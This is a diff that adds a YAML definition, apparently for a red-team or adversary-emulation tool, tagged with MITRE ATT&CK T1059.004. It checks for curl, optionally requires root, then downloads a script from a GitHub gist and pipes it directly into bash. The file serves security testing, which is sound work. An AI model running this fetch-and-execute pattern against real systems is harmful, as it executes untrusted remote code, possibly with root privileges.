@@ -1,0 +1,46 @@
+---
+name: run-bash-script-from-gist
+description: Run an arbitrary bash script from a GitHub gist.
+requirements:
+  platforms:
+    - os: linux
+args:
+  - name: escalate_privileges
+    default: false
+  - name: download_link
+    default: https://gist.githubusercontent.com/l50/2dd5d552c0336e6e8fd7704fd0d194de/raw/0cd2d4d0be1cac1899fc45ff23df8a1ed9ea0409/gistfile1.txt
+mitre:
+  tactics:
+    - TA0003 Execution
+  techniques:
+    - T1059 Command and Scripting Interpreter
+  subtechniques:
+    - T1059.004 Command and Scripting Interpreter Unix Shell
+steps:
+  - name: setup
+    inline: |
+      if ! command -v curl &> /dev/null; then
+          echo "Error: curl is not installed on the current system, cannot download script from Github"
+          exit 1
+      fi
+  - name: ensure-root-user-if-required
+    inline: |
+      echo "{{ .Args.escalate_privileges }}"
+      if [[ {{ .Args.escalate_privileges }} -ne 0 ]]; then
+        if [[ "${EUID}" -ne 0 ]]; then
+            echo "error: TTP must be run as root."
+            exit 1
+        fi
+      else
+        echo "No need to run as root."
+      fi
+  - name: download-and-run-script
+    inline: |
+      curl -sL "{{ .Args.download_link }}" | bash
+      execution_status=$?
+      if [[ "${execution_status}" == 0 ]]; then
+        echo "TTP Ran Successfully"
+        exit 0
+      else
+        exit 1
+      fi
